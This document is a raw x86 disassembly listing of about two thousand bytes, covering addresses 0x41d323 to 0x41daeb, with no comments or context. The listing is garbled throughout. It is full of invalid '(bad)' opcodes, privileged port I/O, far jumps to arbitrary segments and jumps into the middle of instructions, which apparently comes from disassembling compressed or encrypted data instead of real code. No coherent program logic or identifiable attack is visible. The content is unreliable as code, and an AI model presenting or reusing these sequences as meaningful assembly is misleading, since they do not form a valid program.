  41d323:	jo     0x41d305
  41d325:	lods   eax,DWORD PTR ds:[esi]
  41d326:	xchg   esi,eax
  41d327:	ss fcmove st,st(2)
  41d32a:	pop    edi
  41d32b:	push   ebp
  41d32c:	jns    0x41d30d
  41d32e:	into   
  41d32f:	mov    BYTE PTR ds:0x7706bd24,dl
  41d335:	cmp    BYTE PTR [eax+0x699127e0],bh
  41d33b:	mov    dl,0x29
  41d33d:	cs xchg edx,eax
  41d33f:	loopne 0x41d2fc
  41d341:	outs   dx,BYTE PTR ds:[esi]
  41d342:	shl    BYTE PTR [ebp-0x77f6884c],1
  41d348:	xchg   BYTE PTR [eax-0x2af46d5c],ch
  41d34e:	add    al,0x95
  41d350:	aas    
  41d351:	dec    edx
  41d352:	sbb    DWORD PTR ds:0x6809f775,esp
  41d358:	dec    esi
  41d359:	cmc    
  41d35a:	mov    ebp,0x4a255fab
  41d35f:	ror    DWORD PTR [eax],cl
  41d361:	arpl   WORD PTR [ebp+0x57],bx
  41d364:	daa    
  41d365:	into   
  41d366:	xchg   edx,eax
  41d367:	xchg   ebp,eax
  41d368:	or     edx,DWORD PTR [edx+eax*2-0x53]
  41d36c:	push   esi
  41d36d:	mov    al,0x43
  41d36f:	aam    0xde
  41d371:	(bad)  
  41d372:	mov    al,ds:0x7a32f7ed
  41d377:	jne    0x41d311
  41d379:	fwait
  41d37a:	int3   
  41d37b:	mov    ebx,eax
  41d37d:	jno    0x41d35e
  41d37f:	mov    ds:0xc22ca1f9,eax
  41d384:	sbb    BYTE PTR es:[eax+0x2f],ch
  41d388:	cmp    DWORD PTR [eax],0x263cb8e2
  41d38e:	mov    ebp,0xa8c55657
  41d393:	push   esp
  41d394:	sub    al,0x25
  41d396:	bound  ebp,QWORD PTR [ecx+0x51d8f659]
  41d39c:	push   es
  41d39d:	fs add al,0x6f
  41d3a0:	stc    
  41d3a1:	neg    ebx
  41d3a3:	sub    eax,0xbcc5772e
  41d3a8:	outs   dx,BYTE PTR ds:[esi]
  41d3a9:	add    BYTE PTR [ebx-0xf16fcd7],bl
  41d3af:	ficomp DWORD PTR [edi-0x14]
  41d3b2:	jne    0x41d413
  41d3b4:	in     eax,dx
  41d3b5:	enter  0x8bd2,0xd1
  41d3b9:	sub    bl,bl
  41d3bb:	into   
  41d3bc:	outs   dx,DWORD PTR ds:[esi]
  41d3bd:	pop    edi
  41d3be:	mov    eax,edi
  41d3c0:	jnp    0x41d3ab
  41d3c2:	leave  
  41d3c3:	inc    eax
  41d3c4:	and    eax,DWORD PTR [eax]
	...
  41d3ce:	add    BYTE PTR [eax],al
  41d3d0:	add    BYTE PTR [edx-0x300eb0aa],bl
  41d3d6:	stc    
  41d3d7:	mov    esi,0xe316497f
  41d3dc:	stos   BYTE PTR es:[edi],al
  41d3dd:	adc    al,0xc7
  41d3df:	adc    edi,esp
  41d3e1:	int    0x4f
  41d3e3:	add    DWORD PTR [eax],eax
  41d3e5:	lods   al,BYTE PTR ds:[esi]
  41d3e6:	add    eax,DWORD PTR [eax]
  41d3e8:	add    BYTE PTR [edi-0x24],ch
  41d3eb:	jl     0x41d464
  41d3ed:	push   edi
  41d3ee:	mov    ebx,0xb5042ef1
  41d3f3:	imul   edx,DWORD PTR [ecx-0x71],0x13cb41fe
  41d3fa:	enter  0xaba3,0x18
  41d3fe:	repnz mov ecx,0x923cd07
  41d404:	sahf   
  41d405:	push   ebx
  41d406:	dec    edx
  41d407:	ret    
  41d408:	(bad)  
  41d409:	ins    DWORD PTR es:[edi],dx
  41d40a:	mov    dl,0x92
  41d40c:	or     eax,0x76af3dcb
  41d411:	ret    
  41d412:	stc    
  41d413:	mov    dl,0x80
  41d415:	test   esp,esi
  41d417:	jmp    0x9f151daf
  41d41c:	cmp    BYTE PTR [ebx-0x246da0d3],0xd7
  41d423:	xchg   esi,eax
  41d424:	(bad)  [edi+ebp*8+0x166b232b]
  41d42b:	(bad)
  41d42f:	int3   
  41d430:	icebp  
  41d431:	cmc    
  41d432:	shl    DWORD PTR [ecx+0x64ce4ec0],0xf5
  41d439:	mov    bh,0xb3
  41d43b:	cs sahf 
  41d43d:	scas   eax,DWORD PTR es:[edi]
  41d43e:	inc    ebx
  41d43f:	loopne 0x41d3ea
  41d441:	into   
  41d442:	in     al,0x3a
  41d444:	pushf  
  41d445:	pop    ebp
  41d446:	call   0x7325:0x31395de3
  41d44d:	sbb    eax,0x10889437
  41d452:	sub    BYTE PTR [edx],0x9b
  41d455:	in     al,dx
  41d456:	add    BYTE PTR [eax-0x45389f57],dh
  41d45c:	jae    0x41d458
  41d45e:	call   0x181c2517
  41d463:	repnz push es
  41d465:	and    esp,0xffffff82
  41d468:	int    0x74
  41d46a:	fadd   DWORD PTR [ebx-0x6b]
  41d46d:	xchg   edx,eax
  41d46e:	adc    ebp,0x28
  41d471:	cwde   
  41d472:	dec    edi
  41d473:	mov    ah,0xe
  41d475:	mov    ebp,DWORD PTR [ebp+0x1d22cfc2]
  41d47b:	mov    eax,ds:0x27eb089b
  41d480:	int3   
  41d481:	stc    
  41d482:	mov    al,0xb2
  41d484:	jmp    0x408e:0x45a31416
  41d48b:	cmp    al,0x9
  41d48d:	sti    
  41d48e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d48f:	loopne 0x41d4b6
  41d491:	and    BYTE PTR [eax],ah
  41d493:	pop    edi
  41d494:	retf   
  41d495:	xor    al,0xdd
  41d497:	fnstenv [edx-0x43]
  41d49a:	mov    al,0xf6
  41d49c:	not    dh
  41d49e:	sbb    bh,BYTE PTR [edi]
  41d4a0:	mov    eax,ds:0x844f8a02
  41d4a5:	imul   esp,DWORD PTR ds:[edi],0x24648225
  41d4ac:	pushf  
  41d4ad:	or     eax,0x9b53cc29
  41d4b2:	ror    BYTE PTR [edx+0x5d],1
  41d4b5:	xchg   esp,eax
  41d4b6:	mov    ebx,edi
  41d4b8:	popa   
  41d4b9:	icebp  
  41d4ba:	sti    
  41d4bb:	and    BYTE PTR [edi],dh
  41d4bd:	int    0x79
  41d4bf:	mov    edi,0xba981033
  41d4c5:	mov    ah,dl
  41d4c7:	jbe    0x41d465
  41d4c9:	xchg   ebx,eax
  41d4ca:	pop    edi
  41d4cb:	scas   al,BYTE PTR es:[edi]
  41d4cc:	out    dx,al
  41d4cd:	ins    BYTE PTR es:[edi],dx
  41d4ce:	mov    edx,0xdd8c2ba
  41d4d3:	in     eax,0xb5
  41d4d5:	pop    ecx
  41d4d6:	fst    st(0)
  41d4d8:	pop    esi
  41d4d9:	jmp    0x41d4d6
  41d4db:	cmp    al,0x7
  41d4dd:	mov    eax,0xf887c51c
  41d4e2:	xlat   BYTE PTR ds:[ebx]
  41d4e3:	(bad)  
  41d4e4:	imul   edx,DWORD PTR [ebp-0x27],0x32ff9ddd
  41d4eb:	icebp  
  41d4ec:	adc    dh,bh
  41d4ee:	call   0xbc35971b
  41d4f3:	adc    ebp,DWORD PTR [ecx-0x7c]
  41d4f6:	inc    edx
  41d4f7:	mov    edx,DWORD PTR cs:[esi]
  41d4fa:	jg     0x41d52c
  41d4fc:	push   ss
  41d4fd:	dec    ebx
  41d4fe:	push   cs
  41d4ff:	test   DWORD PTR [edi+0x32],0x19344e35
  41d506:	addr16 xor dh,ch
  41d509:	sub    al,0x68
  41d50b:	cli    
  41d50c:	out    dx,eax
  41d50d:	mov    bh,0xb2
  41d50f:	sbb    eax,0xee059591
  41d514:	xchg   ebp,eax
  41d515:	jp     0x41d57d
  41d517:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41d519:	ror    BYTE PTR [ebx-0x54],cl
  41d51c:	dec    ecx
  41d51d:	loop   0x41d4b5
  41d51f:	dec    ebp
  41d520:	push   edi
  41d521:	lock and ch,BYTE PTR [esi-0x1bbea70d]
  41d528:	add    ecx,DWORD PTR [ecx+0x3aa30da2]
  41d52e:	dec    esp
  41d52f:	adc    eax,0x9bc9dde8
  41d534:	add    bl,ah
  41d536:	jb     0x41d506
  41d538:	dec    DWORD PTR [edx+edx*1+0x6212]
  41d53f:	cs cdq 
  41d541:	(bad)  
  41d542:	mov    eax,ds:0xf1cc4c0d
  41d547:	adc    edx,DWORD PTR [esi+0x690672ce]
  41d54d:	mov    ecx,0xc303b3a4
  41d552:	fwait
  41d553:	xlat   BYTE PTR ds:[ebx]
  41d554:	jnp    0x41d4d6
  41d556:	mov    es,WORD PTR [edi+0x132acc25]
  41d55c:	retf   0x485c
  41d55f:	push   cs
  41d560:	lods   eax,DWORD PTR ds:[esi]
  41d561:	sbb    eax,0x9f71552e
  41d566:	mov    al,0xea
  41d568:	popf   
  41d569:	inc    esi
  41d56a:	out    0x90,eax
  41d56c:	push   ebp
  41d56d:	pop    ebx
  41d56e:	(bad)  
  41d56f:	mov    ah,0xf2
  41d571:	dec    esi
  41d572:	rcl    DWORD PTR [ecx+0x22],0xf3
  41d576:	aad    0xce
  41d578:	repz jae 0x41d507
  41d57b:	cmp    edx,esi
  41d57d:	enter  0x895b,0xd1
  41d581:	add    eax,0xac259f55
  41d586:	add    eax,0x6a20f99
  41d58b:	aas    
  41d58c:	or     dh,BYTE PTR [edi-0x327acdc2]
  41d592:	jo     0x41d54e
  41d594:	cmp    DWORD PTR [ecx-0x3837c39f],ecx
  41d59a:	pushf  
  41d59b:	jne    0x41d5a3
  41d59d:	fisubr WORD PTR [ecx+0x5675af68]
  41d5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5a4:	xchg   esp,eax
  41d5a5:	add    al,0x44
  41d5a7:	jns    0x41d5ea
  41d5a9:	fwait
  41d5aa:	sbb    al,0x4c
  41d5ac:	popf   
  41d5ad:	loop   0x41d579
  41d5af:	add    esp,DWORD PTR [esi]
  41d5b1:	fcomp  QWORD PTR [edi-0x15039650]
  41d5b7:	add    DWORD PTR [edx],eax
  41d5b9:	mov    esp,0x6aa607e5
  41d5be:	shr    DWORD PTR [ebp+ebp*8-0x7d83aa83],0x20
  41d5c6:	jo     0x41d5b9
  41d5c8:	fild   WORD PTR ss:[ebx+edi*4-0xb27401d]
  41d5d0:	int    0x1c
  41d5d2:	fst    st(2)
  41d5d4:	jne    0x41d5db
  41d5d6:	lds    edx,FWORD PTR [ebx+eiz*4]
  41d5d9:	mov    esp,DWORD PTR [edx]
  41d5db:	mov    edi,0x346501ff
  41d5e0:	xor    al,0xd1
  41d5e2:	test   bl,ch
  41d5e4:	sbb    al,0xef
  41d5e6:	xor    ebp,DWORD PTR [ebx]
  41d5e8:	fdivrp st(3),st
  41d5ea:	push   esp
  41d5eb:	mov    bl,0x14
  41d5ed:	mov    ch,0x5b
  41d5ef:	loop   0x41d66d
  41d5f1:	add    DWORD PTR [eax+0x5a1995c8],edi
  41d5f7:	or     DWORD PTR [esi+ecx*4-0x7e],edx
  41d5fb:	inc    esi
  41d5fc:	dec    eax
  41d5fd:	ror    DWORD PTR [ebx+0xa2dc3ed],1
  41d603:	fsub   st,st(3)
  41d605:	sub    DWORD PTR [ecx-0x59258702],ebp
  41d60b:	mov    ebp,0x4e6bc290
  41d610:	out    0x99,eax
  41d612:	out    dx,al
  41d613:	jne    0x41d599
  41d615:	sbb    DWORD PTR [ebx-0x67b580d3],edi
  41d61b:	je     0x41d600
  41d61d:	adc    BYTE PTR [eax-0x54ceed99],dl
  41d623:	jp     0x41d65f
  41d625:	cs mov bx,0x6ac1
  41d62a:	push   ecx
  41d62b:	and    al,0x6e
  41d62d:	fisttp WORD PTR [esi]
  41d62f:	shr    BYTE PTR ds:0x31f94e31,cl
  41d635:	dec    ecx
  41d636:	shr    DWORD PTR [ebp-0x7c],1
  41d639:	int3   
  41d63a:	stc    
  41d63b:	cmc    
  41d63c:	pop    esi
  41d63d:	mov    eax,0xdd2b61df
  41d642:	mov    esi,0xef397af4
  41d647:	mov    ah,0xed
  41d649:	call   FWORD PTR [ebp+0x77]
  41d64c:	or     ebp,ebp
  41d64e:	jmp    0x41d5d9
  41d650:	(bad)  
  41d651:	(bad)  
  41d652:	out    dx,eax
  41d653:	daa    
  41d654:	push   esi
  41d655:	adc    BYTE PTR [edi],dl
  41d657:	mov    ebx,0x1e67ba23
  41d65c:	jae    0x41d6d8
  41d65e:	call   0x9b93:0x811d1266
  41d665:	xchg   esi,eax
  41d666:	cmp    al,0xb9
  41d668:	sti    
  41d669:	repz and dh,BYTE PTR [edi-0x119bac86]
  41d670:	mov    ah,0x14
  41d672:	inc    ebp
  41d673:	or     bh,BYTE PTR [edi]
  41d675:	jno    0x41d6c5
  41d677:	mov    BYTE PTR [eax+ebx*1-0x40e1ff81],dh
  41d67e:	leave  
  41d67f:	mov    ds:0x2788b836,al
  41d684:	jmp    0x9237:0x471cafb2
  41d68b:	add    al,0xe7
  41d68d:	sbb    DWORD PTR [ebp+0x20],0x78
  41d691:	inc    edx
  41d692:	adc    cl,BYTE PTR [ebx]
  41d694:	push   0x8795eb9b
  41d699:	jmp    0x41d6a7
  41d69b:	mov    ecx,DWORD PTR [ebp+0x54]
  41d69e:	aaa    
  41d69f:	idiv   DWORD PTR [edi]
  41d6a1:	pop    ecx
  41d6a2:	(bad)  
  41d6a3:	(bad)  
  41d6a5:	xor    al,0x3b
  41d6a7:	dec    esi
  41d6a8:	and    DWORD PTR [eax],esp
  41d6aa:	push   0xfe9ffa02
  41d6af:	cmp    BYTE PTR [eax+ecx*1],ch
  41d6b2:	mov    ch,0xcc
  41d6b4:	add    bh,bh
  41d6b6:	std    
  41d6b7:	call   DWORD PTR [ecx-0x4bb20881]
  41d6bd:	sbb    al,0xf4
  41d6bf:	jmp    0xb7ff:0xc8d7baa1
  41d6c6:	lods   al,BYTE PTR ds:[esi]
  41d6c7:	call   0xffd9:0xcc3928e3
  41d6ce:	ret    0x88a5
  41d6d1:	dec    edi
  41d6d2:	mov    eax,0x25193003
  41d6d7:	jno    0x41d6c8
  41d6d9:	xor    esi,ebp
  41d6db:	inc    edi
  41d6dc:	fcom   DWORD PTR [eax-0x78704f01]
  41d6e2:	ret    0x5d56
  41d6e5:	pop    WORD PTR [ecx]
  41d6e8:	xchg   edx,eax
  41d6e9:	jmp    0xd66a:0x9bf116ba
  41d6f0:	inc    esp
  41d6f1:	xor    ch,BYTE PTR [esi-0x5554e3fa]
  41d6f7:	aad    0xb6
  41d6f9:	inc    esp
  41d6fa:	jp     0x41d6b0
  41d6fc:	fstp   QWORD PTR [esi-0x7a03e954]
  41d702:	ds setb dl
  41d706:	imul   ebx,ebx,0x99ebc48a
  41d70c:	pop    esi
  41d70d:	loopne 0x41d6c4
  41d70f:	stos   BYTE PTR es:[edi],al
  41d710:	bnd jmp ebx
  41d713:	and    al,0xe4
  41d716:	stos   BYTE PTR es:[edi],al
  41d717:	lds    ebx,FWORD PTR [edx+0x64111ae6]
  41d71d:	mov    bl,0xa0
  41d71f:	lea    edx,[edx-0x43152e8]
  41d725:	dec    eax
  41d726:	mov    cl,0xf2
  41d728:	add    DWORD PTR [edi-0x1417e18f],edx
  41d72e:	dec    eax
  41d72f:	jne    0x41d70e
  41d731:	push   edx
  41d732:	std    
  41d733:	cmc    
  41d734:	add    ebx,DWORD PTR [esi-0x5f2ebec9]
  41d73a:	pop    ebp
  41d73b:	ins    DWORD PTR es:[edi],dx
  41d73c:	test   DWORD PTR [eax+0x565ef4de],0x6485c5b7
  41d746:	xchg   ecx,eax
  41d747:	int    0xb2
  41d749:	js     0x41d770
  41d74b:	nop
  41d74c:	shl    BYTE PTR [ecx],0x7c
  41d74f:	jecxz  0x41d72b
  41d751:	adc    DWORD PTR [ecx-0x29],esp
  41d754:	sub    al,0x6c
  41d756:	pop    ss
  41d757:	sbb    DWORD PTR [edi],esp
  41d759:	lea    ecx,[esi*8-0x6467fdc5]
  41d760:	cs data16 loope 0x41d78f
  41d764:	and    BYTE PTR [eax+edx*1],ch
  41d767:	sub    BYTE PTR [ebp-0x2],dl
  41d76a:	je     0x41d7aa
  41d76c:	xor    al,0x82
  41d76e:	(bad)  
  41d76f:	fidiv  DWORD PTR [ebx-0xe]
  41d772:	ss xchg edx,eax
  41d774:	ins    BYTE PTR es:[edi],dx
  41d775:	mov    dl,0x57
  41d777:	fistp  WORD PTR [ebp+0x7a]
  41d77a:	pop    edi
  41d77b:	mov    al,0x30
  41d77d:	cmp    dl,bl
  41d77f:	jp     0x41d787
  41d781:	mov    es,ebx
  41d783:	pop    ebx
  41d784:	jl     0x41d7e1
  41d786:	pop    es
  41d787:	add    ah,dh
  41d789:	shr    BYTE PTR [edi-0x5eb1930a],cl
  41d78f:	mov    ch,0xff
  41d791:	into   
  41d792:	into   
  41d793:	and    ah,BYTE PTR [ecx]
	...
  41d7a1:	cld    
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx+0x62313a2],ah
  41d7af:	or     eax,0x153792b
  41d7b4:	add    BYTE PTR [ebx+eax*1-0x7ab40000],ch
  41d7bb:	push   esp
  41d7bc:	aad    0xbf
  41d7be:	mov    bh,0x74
  41d7c1:	add    esi,ebp
  41d7c3:	imul   edi,ebx,0x1b
  41d7c6:	sub    ch,dl
  41d7c8:	cli    
  41d7c9:	into   
  41d7ca:	mov    edi,DWORD PTR [edx]
  41d7cc:	mov    al,ds:0x4a49581b
  41d7d1:	repz leave 
  41d7d3:	xchg   DWORD PTR [esi+0xa],ecx
  41d7d6:	(bad)  
  41d7d7:	and    al,0x16
  41d7d9:	jmp    FWORD PTR [esi+0x30]
  41d7dc:	adc    BYTE PTR [eax+0x1bbd2e21],dl
  41d7e2:	loope  0x41d79a
  41d7e4:	push   ebx
  41d7e5:	scas   eax,DWORD PTR es:[edi]
  41d7e6:	es stos DWORD PTR es:[edi],eax
  41d7e8:	js     0x41d82a
  41d7ea:	cvtdq2ps xmm4,XMMWORD PTR [ebp+0x56]
  41d7ee:	cmp    DWORD PTR [ecx],0x17
  41d7f1:	cwde   
  41d7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7f3:	rcr    DWORD PTR [edx-0xf],1
  41d7f6:	mov    dl,BYTE PTR ds:0xb16c6bdc
  41d7fc:	jne    0x41d7fe
  41d7fe:	jl     0x41d841
  41d800:	(bad)  
  41d801:	neg    DWORD PTR [edx+0x436fc683]
  41d807:	out    dx,al
  41d808:	pop    eax
  41d809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d80a:	push   esi
  41d80b:	gs leave 
  41d80d:	sub    BYTE PTR [eax-0x19cdbe5e],al
  41d813:	mov    ebp,0x33fcfd92
  41d818:	call   FWORD PTR ds:0xf5257aaa
  41d81e:	push   edx
  41d81f:	and    esp,edx
  41d821:	mov    ecx,0x62390137
  41d826:	jge    0x41d824
  41d828:	cmp    al,0x81
  41d82a:	mov    ds:0xbd2744b0,al
  41d82f:	jmp    0x41d8a7
  41d831:	int3   
  41d832:	lods   al,BYTE PTR ds:[esi]
  41d833:	call   0x32b1:0x2eb05eca
  41d83a:	test   eax,0x31e4f0ca
  41d83f:	fcomp  DWORD PTR [edi+0x2a]
  41d842:	loopne 0x41d87c
  41d844:	ret    0xada3
  41d847:	xchg   edx,eax
  41d848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d849:	or     al,0x64
  41d84b:	fisttp QWORD PTR [ebx-0x6a]
  41d84e:	punpckhdq mm2,QWORD PTR [esi+0x50eb74fe]
  41d855:	loope  0x41d804
  41d857:	add    ch,BYTE PTR [esp+edi*4+0x3c]
  41d85b:	cmp    dl,BYTE PTR [ebp-0x34ccdea6]
  41d861:	dec    ebp
  41d862:	mov    al,bl
  41d864:	adc    al,0x10
  41d866:	add    esi,esp
  41d868:	mov    dl,0x4b
  41d86a:	sub    eax,0xc000007
  41d86f:	jb     0x41d7fb
  41d871:	clc    
  41d872:	push   eax
  41d873:	and    ah,dh
  41d875:	mov    bl,0x12
  41d877:	jns    0x41d802
  41d879:	sub    al,0xc4
  41d87b:	pop    ss
  41d87c:	cld    
  41d87d:	ins    BYTE PTR es:[edi],dx
  41d87e:	cmp    edx,DWORD PTR [ebx+ebx*8]
  41d881:	mov    esi,0xc3ab0b8
  41d886:	ins    DWORD PTR es:[edi],dx
  41d887:	scas   al,BYTE PTR es:[edi]
  41d888:	test   DWORD PTR [edx+0x5eb3c1f4],eax
  41d88e:	hlt    
  41d88f:	jne    0x41d88e
  41d891:	les    edi,FWORD PTR [eax]
  41d893:	loopne 0x41d8eb
  41d895:	mov    ?,edi
  41d897:	xlat   BYTE PTR ds:[ebx]
  41d898:	mov    cl,0x86
  41d89a:	scas   eax,DWORD PTR es:[edi]
  41d89b:	push   eax
  41d89c:	jge    0x41d8ff
  41d89e:	out    dx,al
  41d89f:	aaa    
  41d8a0:	aam    0x57
  41d8a2:	mov    ecx,0x2a0796ea
  41d8a7:	sub    dl,ch
  41d8a9:	sbb    al,0x34
  41d8ab:	cmc    
  41d8ac:	adc    ebp,eax
  41d8ae:	(bad)  
  41d8af:	iret   
  41d8b0:	push   0xd9b12ab5
  41d8b5:	jnp    0x41d890
  41d8b7:	mov    ss,ecx
  41d8b9:	mov    ds:0x22c2c47d,al
  41d8be:	pushf  
  41d8bf:	mov    ds:0x3622eac3,eax
  41d8c4:	mov    ah,BYTE PTR [edx+0x2b3010ad]
  41d8ca:	cwde   
  41d8cb:	dec    ecx
  41d8cc:	gs loopne 0x41d942
  41d8cf:	mov    al,0x97
  41d8d1:	sbb    al,0xca
  41d8d3:	imul   esi,edx,0xcf9b535e
  41d8d9:	xchg   ecx,eax
  41d8da:	mov    eax,0x8fff64ca
  41d8df:	(bad)  
  41d8e0:	(bad)  
  41d8e2:	out    0x8,al
  41d8e4:	test   DWORD PTR [ecx+0x47],0xbd465353
  41d8eb:	push   eax
  41d8ec:	sub    eax,ebp
  41d8ee:	cmp    al,0xef
  41d8f0:	int3   
  41d8f1:	and    DWORD PTR [esi+eiz*1],ecx
  41d8f4:	mov    ch,dh
  41d8f6:	ret    0x2da9
  41d8f9:	mov    dh,BYTE PTR [edx+eax*8]
  41d8fc:	dec    esp
  41d8fd:	popf   
  41d8fe:	jg     0x41d8c5
  41d900:	rcr    ah,0x10
  41d903:	push   cs
  41d904:	in     al,0xe0
  41d906:	jp     0x41d8ef
  41d908:	daa    
  41d909:	dec    BYTE PTR [ebp+0x3e]
  41d90c:	lahf   
  41d90d:	mov    ebp,0x892ad14d
  41d912:	mov    al,ds:0xfdc8c9f7
  41d917:	out    dx,eax
  41d918:	mov    es,WORD PTR [ebx]
  41d91a:	add    al,0xad
  41d91c:	lock sbb BYTE PTR [ecx],dh
  41d91f:	push   edi
  41d920:	bound  esi,QWORD PTR [ecx]
  41d922:	into   
  41d923:	loope  0x41d949
  41d925:	or     al,0x64
  41d927:	inc    ebp
  41d928:	cmc    
  41d929:	sbb    eax,0xdb6a3d9f
  41d92e:	gs push edi
  41d930:	lods   al,BYTE PTR ds:[esi]
  41d931:	mov    bl,0x80
  41d933:	mov    DWORD PTR [ebx+0x6926a265],0x99656db6
  41d93d:	int3   
  41d93e:	adc    al,0x1d
  41d940:	fisubr WORD PTR [edi+0x67]
  41d943:	test   al,0x26
  41d945:	inc    esp
  41d946:	mov    ebp,esi
  41d948:	adc    esp,ebp
  41d94a:	mov    edi,0x343643b7
  41d94f:	sbb    ch,BYTE PTR [ebp+0x4fe17579]
  41d955:	or     BYTE PTR [ecx+eiz*2+0x223afb81],bl
  41d95c:	push   eax
  41d95d:	xor    BYTE PTR [ecx],ch
  41d95f:	xor    DWORD PTR [ebx],edx
  41d961:	inc    edi
  41d962:	icebp  
  41d963:	out    dx,eax
  41d964:	cmp    ebp,DWORD PTR [esi]
  41d966:	mov    esi,DWORD PTR [edx]
  41d968:	cdq    
  41d969:	mov    al,ds:0xcbd17e3d
  41d96e:	call   0x3f03:0x4683ab22
  41d975:	(bad)  
  41d976:	or     BYTE PTR [eax-0x367a927],ah
  41d97c:	lods   eax,DWORD PTR ds:[esi]
  41d97d:	mov    ebx,0x5ec1c783
  41d982:	mov    eax,DWORD PTR [esi-0x24]
  41d985:	or     ch,BYTE PTR [ebx]
  41d987:	movlps QWORD PTR [ecx],xmm0
  41d98a:	pop    esi
  41d98b:	add    BYTE PTR [edi+0x6d24e9cd],0x7
  41d992:	adc    al,0xd
  41d994:	xor    BYTE PTR [eax+esi*2],cl
  41d997:	jecxz  0x41d9ef
  41d999:	mov    al,0x4b
  41d99b:	lahf   
  41d99c:	mov    edx,0x1299cca1
  41d9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a2:	jp     0x41d93e
  41d9a4:	and    eax,0x610bfccd
  41d9a9:	aaa    
  41d9aa:	in     eax,dx
  41d9ab:	aaa    
  41d9ac:	push   ds
  41d9ad:	or     edx,esp
  41d9af:	sub    DWORD PTR [edx],0xfffffffa
  41d9b2:	stc    
  41d9b3:	jb     0x41d967
  41d9b5:	les    edi,FWORD PTR ds:0x86fe6d6
  41d9bb:	xchg   ebx,eax
  41d9bc:	(bad)  
  41d9bd:	mov    ds:0x269c8aed,eax
  41d9c2:	inc    esi
  41d9c3:	cdq    
  41d9c4:	or     ebp,DWORD PTR [eax-0x28]
  41d9c7:	cli    
  41d9c8:	arpl   di,sp
  41d9ca:	rcr    BYTE PTR [ecx],cl
  41d9cc:	in     eax,dx
  41d9cd:	xor    edx,0xffffffec
  41d9d0:	cmp    BYTE PTR [ebx],ah
  41d9d2:	enter  0x688f,0xe1
  41d9d6:	scas   eax,DWORD PTR es:[edi]
  41d9d7:	sbb    eax,0xc8349190
  41d9dc:	daa    
  41d9dd:	bound  edx,QWORD PTR [edi+ebp*1-0x34]
  41d9e1:	call   0xe9e4:0x84612d1f
  41d9e8:	pop    eax
  41d9e9:	adc    esp,eax
  41d9eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ec:	mov    bh,0xac
  41d9ee:	and    ah,BYTE PTR [ecx-0x4e]
  41d9f1:	retf   0xa641
  41d9f4:	xlat   BYTE PTR ds:[ebx]
  41d9f5:	push   cs
  41d9f6:	mov    cl,dl
  41d9f8:	push   0x57
  41d9fa:	pop    ebp
  41d9fb:	add    dh,BYTE PTR [esi+ebp*4+0x50252233]
  41da02:	cmp    esi,DWORD PTR [ebx+0x92b1673]
  41da08:	push   es
  41da09:	push   fs
  41da0b:	mov    eax,0x2bacb828
  41da10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da11:	push   eax
  41da12:	mov    es,esi
  41da14:	mov    WORD PTR [eax],gs
  41da16:	add    eax,0x2a894b13
  41da1b:	pusha  
  41da1c:	dec    esi
  41da1d:	xchg   edi,eax
  41da1e:	pop    es
  41da1f:	into   
  41da20:	add    eax,0x13433e87
  41da25:	or     al,0x49
  41da27:	repz fisub DWORD PTR [eax-0x77b2c270]
  41da2e:	(bad)  
  41da2f:	aas    
  41da30:	retf   
  41da31:	fimul  DWORD PTR ds:0x8f08d402
  41da37:	adc    dh,BYTE PTR [eax+0x5b88af68]
  41da3d:	mov    WORD PTR [ecx],?
  41da3f:	jl     0x41da7a
  41da41:	das    
  41da42:	push   0xe88c352f
  41da47:	je     0x41daa3
  41da49:	pop    edx
  41da4a:	and    al,0xf3
  41da4c:	mov    ebp,0x812a47c3
  41da51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da52:	loopne 0x41da99
  41da54:	or     WORD PTR [ecx-0x70],bx
  41da58:	and    eax,0x54c06019
  41da5d:	hlt    
  41da5e:	es hlt 
  41da60:	inc    esp
  41da61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da62:	aam    0x3a
  41da64:	int3   
  41da65:	mov    dh,0x22
  41da67:	fidivr DWORD PTR [ebx+esi*4+0x28cadee9]
  41da6e:	sti    
  41da6f:	ja     0x41daac
  41da71:	cld    
  41da72:	or     dl,BYTE PTR [ecx+0x1d]
  41da75:	push   eax
  41da77:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da79:	(bad)
  41da7e:	icebp  
  41da7f:	shr    DWORD PTR ds:0x7d3e3522,1
  41da85:	mov    DWORD PTR [esi+0x25],0x61bd64a7
  41da8c:	aam    0xda
  41da8e:	fwait
  41da8f:	pop    edx
  41da90:	dec    eax
  41da91:	nop
  41da92:	rcl    DWORD PTR [ecx-0x1a2f5981],cl
  41da98:	mov    ebx,0x1683a611
  41da9d:	cmp    edi,edi
  41da9f:	cdq    
  41daa0:	jecxz  0x41daa8
  41daa2:	add    DWORD PTR [edx-0x4764eb8c],edi
  41daa8:	shl    DWORD PTR [ecx+0x307e705a],1
  41daae:	(bad)  
  41dab3:	rol    DWORD PTR ds:0x6b42b9b2,cl
  41dab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daba:	adc    cl,ch
  41dabc:	iret   
  41dabd:	xchg   esi,eax
  41dabe:	xor    bh,bh
  41dac0:	add    ecx,DWORD PTR [esi+edi*2+0x60]
  41dac4:	dec    ebx
  41dac5:	aaa    
  41dac6:	xchg   DWORD PTR ds:0x7f35087c,eax
  41dacc:	cli    
  41dacd:	mov    esp,0x922cc55b
  41dad2:	stc    
  41dad3:	btr    DWORD PTR [edx-0x11],ebx
  41dad7:	gs inc ebx
  41dad9:	ins    BYTE PTR es:[edi],dx
  41dada:	in     eax,dx
  41dadb:	mov    dl,0x27
  41dadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dade:	xchg   ebx,eax
  41dadf:	add    bl,BYTE PTR [esi]
  41dae1:	jmp    0xc254:0xf609d3df
  41dae8:	repnz xchg esp,eax
  41daea:	clc    
  41daeb:	jmp    0x41dac8
